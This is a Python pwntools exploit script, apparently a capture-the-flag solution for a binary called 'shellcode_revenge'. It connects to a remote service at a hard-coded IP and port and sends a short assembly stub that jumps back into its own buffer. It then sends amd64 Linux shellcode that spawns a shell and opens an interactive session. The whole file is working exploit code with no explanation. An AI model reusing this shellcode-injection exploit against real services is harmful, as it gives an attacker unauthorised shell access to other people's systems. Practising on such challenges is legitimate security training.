#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = False

c = 0
pwn_file = "./shellcode_revenge"
elf = ELF(pwn_file)
if debug:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2112)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    b *0x0400664
    c
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

# 0x400666  - 0x40063d = 41
c.send(asm('pop rax; sub al, 41; jmp rax') + b'\0')
c.send(asm(pwnlib.shellcraft.amd64.linux.sh()))

c.interactive()
c.close()
